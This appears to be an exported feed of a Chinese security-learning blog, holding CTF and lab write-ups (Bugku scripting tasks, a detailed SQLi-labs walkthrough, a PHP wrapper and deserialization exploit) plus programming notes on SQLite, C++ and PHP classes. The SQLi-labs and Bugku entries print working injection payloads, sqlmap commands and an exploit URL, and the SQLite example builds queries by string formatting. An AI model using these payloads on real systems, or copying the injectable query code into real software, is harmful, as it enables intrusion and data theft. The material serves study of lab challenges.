      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-手速问题]]></title>
    <url>%2F2018%2F11%2F08%2FBugku-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[这两道题用到的知识点都是python爬虫和session的使用，就放一块写wp吧 秋名山老司机 每次刷新表达式都不一样，那就用写脚本的方式来做 利用python的requests库进行页面爬取表达式，再用python的eval函数来计算表达式的值，最后进行post提交 开始写的错误脚本： import requests url = &apos;http://123.206.87.240:8002/qiumingshan/&apos; req = requests.get(url).text start = req.find(&apos;div&apos;) end = req.find(&apos;=?&apos;) do = req[start+4:end] num = eval(do) data = {&apos;value&apos;: num} r = requests.post(url, data=data) print(r.text)这样运行后不会反回flag，why?我又从网上搜了这道题的脚本，发现别人用了’session()’这个东西 按照我上面写的，计算好当前页面的表达式的值后，进行post提交时再次访问了页面，表达式又变化了，因此提交的值就不是当前页面的值了 从网上了解到会话对象session： session对象能够帮我们跨请求保持某些参数，也会在同一个session实例发出的所有请求之间保持cookies。 改正后脚本： import requests url = &apos;http://123.206.87.240:8002/qiumingshan/&apos; s = requests.session() req = s.get(url).text start = req.find(&apos;div&apos;) end = req.find(&apos;=?&apos;) caculate = req[start+4:end] value = eval(caculate) data = {&apos;value&apos;:value} req1 = s.post(url,data=data) print(req1.text) 速度要快题目 在源代码发现 不知道要post提交什么，看下响应头，发现了flag，而且每刷新一次flag就改变一次，与秋名山老司机很像 进行base64解码 发现解码后的后面几位字母还能进行解码 估计就是要post提交这几位数字 写脚本 import requests import base64 url = &apos;http://123.206.87.240:8002/web6/&apos; s = requests.session() req = s.get(url).headers flag = req[&apos;flag&apos;] flag = base64.b64decode(flag).decode(&apos;utf-8&apos;) #第一次解码 start = flag.find(&apos;吧&apos;) flag = flag[start+3:] flag = base64.b64decode(flag).decode(&apos;utf-8&apos;) #第二次解码 data = {&apos;margin&apos;:flag} res = s.post(url,data=data) print(res.text)]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Sqlite3+Flask]]></title>
    <url>%2F2018%2F11%2F04%2Fsqlite3-flask%2F</url>
    <content type="text"><![CDATA[想要使用sqlite数据库和flask实现网页的注册登陆，记录一下 SQLite，是一款轻型的数据库，python3中内置 import sqlite3参考 https://www.jb51.net/article/118394.htmsqlite3中的操作下载sqlite3… 进入users.db数据库： 进入数据库时若数据库被未创建，则执行命令会新建数据库显示数据库中的表： 获取表中的数据： 退出sqlite 表中插入数据insert into table_name( column1,column2...) values( value1,value2...);删除表 显示建表语句 python引入sqlite3import sqlite3 conn = sqlite3.connect(&quot;D:/sqlite/database/users.db&quot;) # 连接数据库 cu = conn.cursor() # 建立游标 operate = 1 while operate != 0: operate = int(input(&quot;输入数字选项执行下列命令：\n0.退出操作 1.查询所有数据 2.插入数据 3.删除数据\n&quot;)) if operate == 1: search_sql = &quot;select * from information;&quot; cu.execute(search_sql) # 执行sqlite语句 result = cu.fetchall() # 获取所有查询数据 for i in result: print(i) conn.commit() # 提交事务 elif operate == 2: num = int(input(&quot;请输入id： &quot;)) username = input(&quot;请输入用户名： &quot;) password = input(&quot;请输入密码： &quot;) insert_sql = &quot;insert into information(id,username,password) values(%d,&apos;%s&apos;,&apos;%s&apos;);&quot; % (num, username, password) try: cu.execute(insert_sql) conn.commit() print(&quot;插入成功！&quot;) except Exception as e: print(&quot;重复id！&quot;) elif operate == 3: num = int(input(&quot;请输入要删除的id： &quot;)) delete_sql = &quot;delete from information where id=%d;&quot; % num try: cu.execute(delete_sql) conn.commit() print(&quot;删除成功！&quot;) except Exception as e: print(&quot;无此id！&quot;) else: print(&quot;输入的指令有误，请重新输入！&quot;) cu.close() # 关闭游标 conn.close() # 关闭数据库连接]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[栈-回文判断]]></title>
    <url>%2F2018%2F10%2F31%2F%E6%A0%88-%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD%2F</url>
    <content type="text"><![CDATA[使用顺序栈判断回文：将一半字符入栈，然后出栈与剩下的一半字符比较，如果都相符即为回文 代码如下： #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 struct Sqstack //顺序栈 { char *Top; char *Base; int stacksize; }; int Push(char elem,Sqstack &amp;S) { if (S.Top - S.Base == S.stacksize) { cout &lt;&lt; &quot;栈已满！&quot; &lt;&lt; endl; return 0; } *(S.Top) = elem; S.Top+=1; } int Judge(char elem,Sqstack &amp;S,bool &amp;flag) { if (S.Top == S.Base) { cout &lt;&lt; &quot;栈为空！&quot; &lt;&lt; endl; return 0; } S.Top-=1; cout &lt;&lt; *(S.Top) &lt;&lt; &quot; 比较 &quot; &lt;&lt; elem &lt;&lt; endl; if (*(S.Top) != elem) { flag = false; return 0; } } int main() { char str[MAXSIZE]; int length = 0; Sqstack S; bool flag = true; int i; S.Base = new char[MAXSIZE]; if (!S.Base) { cout &lt;&lt; &quot;空间分配失败！&quot; &lt;&lt; endl; return 0; } S.Top = S.Base; //初始栈顶指针指向栈底 S.stacksize = MAXSIZE; //将栈最大容量置位预定义的最大容量 cout &lt;&lt; &quot;请输入需要判断的字符串&quot; &lt;&lt; endl; cin &gt;&gt; str; //获取输入的字符串长度 while (str[length]) { length++; } //将字符一半入栈 for (i = 0; i &lt; length / 2; i++) { Push(str[i],S); } //将入栈的字符出栈，并与数组中剩余的一半进行比较 for (i=length-length/2; i&lt;length; i++) { Judge(str[i],S,flag); } if (flag) { cout &lt;&lt; &quot;是回文&quot; &lt;&lt; endl; } else { cout &lt;&lt; &quot;不是回文&quot; &lt;&lt; endl; } system(&quot;pause&quot;); return 0; }]]></content>
      <categories>
        <category>C++</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQLi LABS wp]]></title>
    <url>%2F2018%2F10%2F24%2FSQLi-LABS-wp%2F</url>
    <content type="text"><![CDATA[总结sqli labs的注入思路 查询时要判断是否要将主查询回显数据置空！ GET型注入时，浏览器自动将单引号&#39;url编码，但没有将井号符#编码，查询时需要自己将#url编码成%23,或用--+ 可在题的php文件中做修改，将查询的sql语句输出出来 2019/3/14更新，重新整理一下，以便以后学习 一些关键词： union : 将两个或两个以上select语句的查询结果合并 order by num : 将数据以第num列进行排序，默认按照首字符的16进制进行排序 infomation_schema : mysql下的系统数据库，存储着所有数据库相关的信息；一般在注入时使用的表有： tables : 存储着数据库中的表名 columns : 存储着表中的列字段名 schemata : 存储着所有数据库名 与information_schema配合使用的关键字有： table_name : 表名 column_name : 列名 table_schema : 当前数据库名 schema_name : 数据库名 一些函数： database() : 当前数据库 group_concat() : 将查询到的多行内容集合到一行显示 sleep(num) : 睡眠num秒 benchmark(num, func()) : 将函数func执行num次 concat() : 连接字符串 version()或@@version ：MySQL 版本 user() ：数据库用户名 @@datadir ：数据库路径 @@version_compile_os ：操作系统版本 SQLi LABS1.单字符注入 输入 id=1&apos;出现 在’1’后面多出了一个单引号，则为字符型注入 查询字段列数： order by 1%23 # order by num即为以第num列进行排序 当order by 4时出现错误，即主查询有三个字段，联合查询也必须有三个查询字段 当前数据库（使用database()函数） union select 1,2,database()%23得到当前数据库为：security 一些知识： information_schema 相当于一个数据库 这个数据库有一张tables表，有一张columns的表，其中： tables这张表有table_name(表名)、table_schema(表所在数据库名)这两个字段 columns这张表有column_name(字段名)这个字段当前数据库中的表 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;%23or（直接用select database()指定为当前数据库） union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database())%23得到表：emails,referers,uagents,users 其中表users的字段 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;%23得到字段名后，获取字段下的数据 union select 1,2,group_concat(id) from users%232.数字型注入输入 id=1&apos; 输入的id没有出现错误，而在LIMIT 0,1前面出现了一个单引号，则说明为数字型注入 则输入语句格式为(与第一题字符型输入类似) id=0 union select......%233.加括号的注入输入 id=1&apos;出现 可推测出输入的id位于一个括号内 则需要在单引号’后加半个括号)来闭合前面的半个括号( 注入时输入 id=0&apos;) union......%23即可 验证： 4.双引号的字符型注入+括号输入 id=1&apos; 发现正常显示 除了单引号，括号、中文单引号等都试了，发现页面没有报错 试了下双引号，成功引起报错 还发现双引号后面有半个括号，则需要将括号闭合 注入时输入 0&quot;) union ......%23即可 验证 php内的语句为 $id = &apos;&quot;&apos; . $id . &apos;&quot;&apos;; $sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;注：若输入 id=1&apos;则查询语句会成为 SELECT * FROM users WHERE id=(&quot;1&apos;&quot;) LIMIT 0,1&quot;那么问题来了，为什么仍然会查询，不会报错呢？ 查看资料，书上有这样一句话： 严格的说，数字也是字符串，只不过在查询数据为数字时不会加引号 我测试了一下 即sql也可以自动转化数据类型 5.双查询注入这个题弄了好久，与前几题相比需要学习一些新的知识 concat()：把两个字符串连接到一起 rand()：是一个随机函数，返回大于0，小于1的随机值 floor():将小数向下取整，如floor(0.5)的值为0，floor(rand())的值为0 count(*): 返回表中的记录数(属于聚合函数) select id as newName : 将id起了一个新名字返回回来 group by : 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。 (与order by 很像，默认上下顺序：数字从小到大，字母按字母表顺序)先进行测试： 数据库名：test1 表users中的数据： 使用双查询： 即查询时先进行concat中的语句： select database() 返回test1 floor(rand()*2) 随机返回0，或1经过concat()连接后就成为了test10(随机返回0) 多查询几次，发现还有另外三种情况： 由于原表数据有两行，因此只返回了两行数据，四种情况 1.test10 test11; 2.test11 test10; 3.test11 test11; 4.test10 test10;就相当于 select 1 from users; 会返回两行1 select 2 from users; 会返回两行2但由于子查询（concat()中的查询)是个随机数，因此会将随机的查询的结果整合并返回(循环查询并插入) 此外，可以用as newName的形式将返回的结果新起一个字段名： 使用group by: 表users数据： 分组： 注意到了根据username进行分组时，重复的数据只显示了一个 这是怎样执行的呢？ 看了一篇大佬的博客，说使用group by子句时，相当于事先创建了一个虚拟的表，之后再进行select查询 group by username即以username为一个字段，相同的值合并为一行 如，当前表数据为： 则group by username的虚拟表数据为 id username password 5 biubiubiu asdfg 4 adfdf1 1 gtfly 66666 3 1234321即一行里面id与password有两个数据，用聚合函数sum函数（计算数值和）验证： 现在，测试这条语句： select count(*) from users group by floor(rand()*2);测试发现有一定几率会出错： 为什么会这样呢？ 上面说了，执行group by之前会创建一个虚拟表 group_key count(*) ... ...group_key为主键 查询第一条数据，floor(rand()*)会执行一次，假设返回的值为0，发现虚拟表中的主键没有0这个值，则会准备插入这个值，插入时会再执行一次，假设第二次返回1，则此时虚拟表为： group_key count(*) 1 1查询第二条数据，floor(rand()*2)会执行一次，假设返回的值为1，发现虚拟表中的主键有这个值，则不会再执行一次，直接插入，此时虚拟表为： group_key count(*) 1 2查询第三条数据，floor(rand()*2)会执行一次，假设返回的值为0，发现虚拟表中的主键没有这个值，则准备插入，会再执行一次，假设第二次返回的值是1，但虚拟表已经存在1这个主键了，则会报错 参考链接（感谢大佬） https://www.cnblogs.com/dplearning/p/7355595.html回到这个题 输入 ?id=1&apos;会报错，进行单引号注入，使用order by语句正常得出有三个字段，但是进行联合查询时却总显示 看了下源代码，发现根本没有查询成功后的输出语句，只会输出报错的语句 但可以利用双查询注入出现的重复键值的报错来获取信息，运用上述知识 ?id=0&apos;union select 1,count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a%23;因为具有随机性，多刷新几下 得到数据库名security 之后获取表，发现 ?id=0&apos;union select 1,count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),floor(rand()*2)) as a from information_schema.tables group by a%23;这条语句不起作用 为什么呢？测试了一下，发现果然这样的注入方式有问题 group by 后面为表原字段名时，group_concat将分组后的虚拟表的每行数据整合并正常返回 换了一条语句，使用limit a,b(返回从a+1开始的b条的数据)，逐个查询 ?id=0&apos;union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a%23; 可以得到第一个表的名，不断更换limit的值便可得出所有表…… 6.双引号双查询注入输入单引号不报错，用双引号发现报错了，注入方式同第五题 7.导出注入构造 ?id=1 构造 ?id=1&apos;出错 再构造 ?id=1&apos;%23发现仍出错，继续构造 ?id=1&apos;)%23 出错 ?id=1&apos;))%23 不出错则可根据页面是否出现’You are in…’进行盲注(参考第8题) 但这道题目的不是让用盲注做的，而是用导出文件的方法来做，即将数据信息导出到一个文件中 参考： https://mp.weixin.qq.com/s/ehrsRA5AReVkOUm-ELw3cw句式： select ... from ... into outfile 文件详细路径名;先用order by得到主查询序列，为3 再构造 ?id=1&apos;)) union select database() into outfile &apos;C:/datas/test.txt&apos;%23这时页面仍显示错误，但已经导出成功了 … 在awd攻防中，可以利用导出一句话到一个php文件来拿到shell 8.布尔型盲注输入 ?id=1显示‘you are in’，但在1后面加一个单引号，不会报错，什么都不显示(第五、六题会报错) 然后在1’后面加上%23，又显示了‘you are in’，说明这是单引号注入类型，但是不会将错误语句输出出来 此时，使用双查询语句，要么会显示‘you are in’，要么什么都不显示(因为有随机性) 则要进行盲注了 不会显示报错语句，那盲注是什么原理来获取信息呢？ 即：不断使用查询语句，根据页面是否显示‘you are in’来判断查询语句是否正确，再根据查询的内容即可获取信息 需要了解一些知识： sql: length(str)：返回str字符串的长度。 substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回(pos从1开始) ascii(str)：返回字符的ASCll的值 python: chr(str): 返回ascll码对应的字符 这里用到了ascii()进行判断(c后面两个字母是i而不是l，第一次发现2333)，因为数据库的名或字段名不一定全都是字母 要获取数据库的第一位(注意！！！由于用到了and，此时id不能为0或其他无回显的值，否则无论怎样注入，页面都不会有显示的值) ?id=1&apos;and ascii(substr((select database()),1,1))=num或(将and改为or即需要将id值置为0) ?id=0&apos;or ascii(substr((select database()),1,1))=num由于ascii有128个(0-127)，则不断更改num的值，如果查询正确，即页面显示‘you are in’，即可得到数据库名的第一位 如，当num为115时(对应为’s’)，页面显示‘you are in’，即可推断出数据库第一位为’s’ 但由于num的范围大，不能用手一个个测试，因此可以用python写脚本的方法，运行脚本逐个获取各个位的值 脚本跑的太慢了，用sqlmap试试 sqlmap.py -u &quot;网址&quot; --current-db -D 数据库名 --tables -T 表名 --columns -C 列名 --dump 盲注的过程真的太慢了。。。 9.基于时间的盲注上面的基于布尔型的盲注是根据页面是否显示”You are in”查询的信息是否正确，但如果查询的信息错误但页面仍显示”You are in”呢？看这道题的代码 这时候，就要用到： sleep(5) 延迟5秒 if(A,B,C) 如果表达式A成立，则返回B，否则返回C构造 ?id=1 and if(length(database())&gt;5,sleep(5),0)如果数据库名长度大于5，则会执行sleep(5)，进行测试 可以看到执行了7秒多，但将&gt;5改成&lt;5 发现执行了1秒多，说明数据库长度大于5 则可以根据页面返回时间来判断查询语句是否正确获取信息，用sqlmap获取： sqlmap.py -u &quot;http://127.0.0.1/labs/Less-9/?id=1&quot; --current-db … 10.基于时间的盲注-双引号将第九题的单引号改为双引号即可注入 11.post-单字符注入一个登录框 查看源代码，提交方式为post select ... from ... where username=&apos;$username&apos; and password=&apos;$password&apos;在username与password中分别输入 1 asdf 提示登录失败 再次输入 1&apos; asdf 发现报错语句中出现 asdf&apos; LIMIT 0,1则猜测为单字符注入，后台的查询语句为 SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1;输入后成为 WHERE username=&apos;1&apos;&apos; and password=&apos;asdf&apos; LIMIT 0,1;则使用or进行绕过，输入以下内容即可(post用#进行注释)： 1&apos;or 1=1# asdf #随意密码此时查询语句为 即用or 1=1 绕过username，并用注释#绕过password 登录进去了，由于LIMIT 0,1，查询到了表的第一条，那么现在输入： 1&apos;or 1=1 order by 2# asdf发现正常，继续： 1&apos;or 1=1 order by 3# asdf报错，则主查询有两列，构造： 1&apos;or 1=1 union select 1,database()# asdf但是查询出来的仍是Dumb，因为or 1=1 将所有数据查询出来，但只有一个显示位，显示首位 那么要获取剩下的数据呢？ 则可加上limit语句 1&apos;or 1=1 union select 1,database() limit 0,1# asdf由于or 1=1 永真，会将所有数据查询，union后会将联合查询的数据加入到主查询数据的后面，则不断改变limit的值，最后一个数据即为联合查询的数据库名 查到13时， 1&apos;or 1=1 union select 1,database() limit 13,1# asdf 第14会报错，则说明当前数据库为security,说明username与password的数据有12行 进行查表 1&apos;or 1=1 union select 1,table_name from information_schema.tables where table_schema=&apos;security&apos; limit 13,1# asdf可查出第一个表，13增大获取剩下的表，到16时得到users的表，也为最后一个表 接下来获取字段，构造： 1&apos;or 1=1 union select 1,column_name from information_schema.columns where table_name=&apos;users&apos; limit 13,1# asdf得到id字段，13改为14得到username字段，改为15得到password字段，改为16报错 接下来进行查询用户名和密码数据： 1&apos;or 1=1 union select username,password from users limit 0,1# asdf… 12.post-双引号+括号注入构造 1&apos; asdf不报错，登陆失败，则将’改成” 1&quot; asdf引起报错 还出现了括号，则构造 1&quot;)or 1=1# asdf即成功登录，并显示了返回的信息，注入同11题 13.post-双查询注入构造 1&apos; asdf 则构造 1&apos;)or 1=1# asdf发现登录成功，但无返回的信息，既然有返回的报错信息，那就用双查询注入，构造 1 1&apos;)or 1=1 union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#多登录几次，爆出错误，得到了当前数据库名 剩下的爆表、字段…即可按照第5题的方法做 14.post-双查询注入-双引号上题是单引号引起报错，并需要括号闭合进行注入，这道题双引号引起报错，构造 1 1&quot;or 1=1 union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#… 15.post-基于布尔型/时间型盲注构造 1 1&apos;出现登录失败，但未显示错误，尝试双引号仍失败、无错误，构造 1 1&apos;or 1=1#可成功登录，但无信息 由于页面只有登录成功、登录失败两种状态，无报错，无登陆成功后的查询信息 但是页面中区分登录成功与失败的标志就是页面上的图片，查看源代码找到了登录成功显示的图片名为’flag.jpg’，登录失败后的图片名为’slap.jpg’，则可根据页面是否有关键字’flag.jpg’来判定，进行布尔盲注，当然，也可以进行时间盲注 16.post-基于布尔型/时间型盲注构造 1 1&apos;登陆失败，无报错 1 1&quot;登陆失败，无报错，进行绕过 1 1&apos;or 1=1#登陆失败，无报错 1 1&quot;or 1=1#登陆失败，无报错 则使用sleep函数检测 1 1&apos;or 1=1 and if(length((select database()))&gt;5,sleep(5),0)不成功，继续测试： 1 1&quot;or 1=1 and if(length((select database()))&gt;5,sleep(5),0)不成功，继续测试： 1 1&apos;)or 1=1 and if(length((select database()))&gt;5,sleep(5),0)不成功，继续测试： 1 1&quot;)or 1=1 and if(length((select database()))&gt;5,sleep(5),0)成功！页面响应超级慢 即可进行盲注 17.post-reset password从这题开始就与前面的题很不一样了，先分析php源代码 首先看check_input这个函数，传入一个变量$value，如果不为空则进行截取前15位 function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;; } else { $value = intval($value); } return $value; }接下来，如果post传来了uname与passwd参数，则将uname传入check_input函数中，将返回值赋值给$uname，将passwd参数的值赋值给$passwd // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { //making sure uname is not injectable $uname=check_input($_POST[&apos;uname&apos;]); $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;); fwrite($fp,&apos;New Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp);之后进行执行SQL语句查询用户名 如果查到了，则会执行update语句，将用户名的密码设置为传进来密码，如果执行出错，则会输出错误，如果未出错，则什么都不会输出；最后会输出一张图片” You password has been successfully updated “ ; 如果未查到用户名，则会输出一张图片”Bug off you Silly Dumb hacker”; // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); //echo $row; if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; $row1 = $row[&apos;username&apos;]; //echo &apos;Your Login name:&apos;. $row1; $update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; if (mysql_error()) { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; //echo &quot; You password has been successfully updated &quot; ; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } echo &apos;&lt;img src=&quot;../images/flag1.jpg&quot; /&gt;&apos;; //echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; //echo &quot;Bug off you Silly Dumb hacker&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } }即： 1.输入的用户名必须要存在 2.只能利用报错语句输出查询信息经过测试，发现admin这个用户是正确的用户，构造 admin 1&apos;出现了错误 则为单引号注入 进行报错注入： 参考 https://blog.csdn.net/zpy1998zpy/article/details/80631036了解到使用下列两种函数 updatexml(目标xml文档，xml路径，更新的内容) # 更新xml文档 extractvalue(目标xml文档，xml路径) # 对xml文档进行查询了解了一下XML 使用这两个函数时，即使查询不到目标xml文档、xml路径也不会报错，但xml路径格式写错了就会报错，并返回写入的错误语句的内容 现在构造 admin 1&apos; and updatexml(1,concat(&apos;~&apos;,(select database())),1)# // 1&apos; and extractvalue(1,concat(&apos;~&apos;,(select database())))# 之后更改xpath的值就可以进一步查询了 SQL盲注脚本思路： 获取数据库名长度-获取数据库名-获取表名长度-获取表名-获取每个表中字段名 根据字段名和表名获取数据信息布尔型： 主要利用substr函数(mid)进行名称的逐位ascii码比较，根据页面是否有关键字来判定是否为正确信息时间型： 主要利用if和sleep函数，若正确则页面响应sleep的时间，此时会响应出错 则用python的try和except进行判断，若出错则信息正确POST: 与布尔型方法一样，由于有username与password两部分输入，要多输入一个值 输入值的时候要符合HTML的输入框的键名]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php类与对象]]></title>
    <url>%2F2018%2F10%2F19%2Fphp%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[类与对象一个类可以包含有属于自己的常量，变量（称为”属性”）以及函数（称为”方法”） 声明类的声明如下： class 类名 { }属性和方法的访问修饰符：有以下几种访问修饰符： public 共有的，由public修饰的属性和方法可以在类里面、类外面、子类里面访问 protected 受保护的，由protected修饰的属性和方法 能够在类里面和子类里面访问 private 私有的 由protected修饰的属性和方法只能在类里面访问 static 静态，声明类属性或方法为静态，就可以不实例化类而直接访问；定义静态则不管是否使用，都会占用空间 例子在一个类的内部使用本类的属性或方法时可使用$this &lt;?php class Test //定义类 { public $name; //公有属性 //$this-&gt;shuchu(); //调用shuchu()方法 function shuchu() //方法 { echo $this-&gt;name; //输出属性$name } } $a = new Test(); //要创建一个类的实例，必须使用 new 关键字 $a-&gt;name=&apos;hello&apos;; //将属性赋值为&apos;hello&apos; $a-&gt;shuchu(); //调用方法，输出hello ?&gt; $this 代表当前对象 self 代表当前类 parent 代表父类 调用方式： -&gt; 用类的实例调用对象 :: 可以用类直接调用属性和方法 继承如果一个类扩展了另一个，则父类必须在子类之前被声明 12345678910111213141516171819202122232425262728293031&lt;?phpclass foo&#123; public function printItem($string) &#123; echo 'Foo: ' . $string . PHP_EOL; &#125; public function printPHP() &#123; echo 'PHP is great.' . PHP_EOL; &#125;&#125;class bar extends foo&#123; public function printItem($string) &#123; echo 'Bar: ' . $string . PHP_EOL; &#125;&#125;$foo = new foo();$bar = new bar();$foo-&gt;printItem('baz'); // Output: 'Foo: baz'$foo-&gt;printPHP(); // Output: 'PHP is great' $bar-&gt;printItem('baz'); // Output: 'Bar: baz'$bar-&gt;printPHP(); // Output: 'PHP is great'?&gt; 魔法方法魔法方法都有个自动调用的功能；魔法方法开头有两个下划线 __toString()方法用于一个对象被当成字符串时应怎样回应。 如： ?php class Test { public $name; function __tostring() { return &apos;you are wrong!&apos;; } } $a = new Test(); var_dump($a); echo &apos;&lt;br&gt;&apos;; echo $a; ?&gt;运行显示 注：该方法要有个返回值 sleep()与wakeup()serialize()函数会检查类中是否存在一个魔法方法__sleep(),如果存在，该方法会先被调用 unserialize()函数会检查类中是否存在__wakeup()，如果存在，该方法会先被调用 construct()与destruct()__construct():具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 __destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 可以使用unset()来人为主动销毁一个对象；当一个对象没有变量指向它的时候，就会被销毁，如果不销毁，则系统在程序运行完全结果后，会去销毁对象；并且此时销毁的顺序跟其创建的顺序相反 sleep()、wakeup()、construct()与destruct()执行顺序&lt;?php class user { function __construct() { echo &apos;make&apos;.&quot;&lt;br&gt;&quot;; } function __wakeup() { echo &apos;wake&apos;.&quot;&lt;br&gt;&quot;; } function __destruct() { echo &apos;destroy&apos;.&quot;&lt;br&gt;&quot;; } function __sleep() { echo &apos;sleep&apos;.&quot;&lt;br&gt;&quot;; return(array(&apos;name&apos;)); } } $u = new user(); $u-&gt;name = &quot;Leo&quot;; $s = serialize($u); echo $s; echo &quot;&lt;br&gt;&quot;; $u2 = unserialize($s); ?&gt;]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-welcome to bugkuctf]]></title>
    <url>%2F2018%2F10%2F19%2FBugku-welcome-to-bugkuctf%2F</url>
    <content type="text"><![CDATA[一道题牵扯出一大堆php知识点。。。 查看源代码 牵扯到两个PHP伪协议，第一个为php://input file_get_contents()函数里面放的不止文件名，还可以放php的伪协议，如果把这个php://input作为文件名放进去的话，这个函数发现是一个伪协议，那作为一个“文件”，它里面肯定是没有内容的吧，那要怎么把它的内容变成一个字符串呢，它会读取我们post传递的数据作为它的”文件内容“，然后再变成一个字符串。 比如说我们现在有这么一句 file_get_contents(“php://input”)，然后我们又post传递了一个数据的话，那这个数据就会被php://input读取到，然后file_get_contents又把它变成字符串。 第二个为php://filter 在include文件时，不让php代码运行，而是直接将其进行base64编码显示，解码后即为源代码 又在include($file)后提示有hint.php，因此构造 ?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php同时使用post传递字符串’welcome to the bugkuctf’，得到了base64编码后的字符，将其解码得到 &lt;?php class Flag{//flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); } } } ?&gt; 即当由类定义的对象转换成字符串时会调用魔法方法__tostring，会输出属性file的值，并返回good 看到有提示flag.php，于是将上面构造的网址改成 ?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=flag.php进行post后显示 猜测信息藏在index.php中，再次将网址中的flag.php改成index.php，将得到的解码 &lt;?php $txt = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $password = $_GET[&quot;password&quot;]; if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello friend!&lt;br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;不能现在就给你flag哦&quot;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } }else{ echo &quot;you are not the number of bugku ! &quot;; } ?&gt; &lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php }else{ echo &quot;you are not admin ! &quot;; } --&gt; 即: file的值如果有字符串’flag’，则会退出；如果没有，则会进行文件包含，并且执行password的unserialize（反序列化） 由此可得出flag很可能藏在flag.php里面 在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。 如将’hello’这个字符串进行序列化，输出后会成为 s:5:&quot;hello&quot;;结合上面的hint.php文件，include可以将hint.php文件包含到index.php文件，即将Flag类引入到index.php； $password进行反序列化后如果为对象，则echo时会调用魔法方法__tostring，再令对象的属性为flag.php，则file_get_contents()会获取flag.php的代码并当成字符串 则写一个php脚本，构造所需的序列化： &lt;?php class Flag{//flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); } } } $a=new Flag; $a-&gt;file=&apos;flag.php&apos;; //使file为flag.php echo serialize($a); //序列化对象 ?&gt; 得到 O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}此时可以进行验证了，构造网址为 http://123.206.87.240:8006/test1/index.php?txt=php://input&amp;file=hint.php&amp;password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}得到flag P：原来使用burpsuit进行post请求还挺方便的 pp: 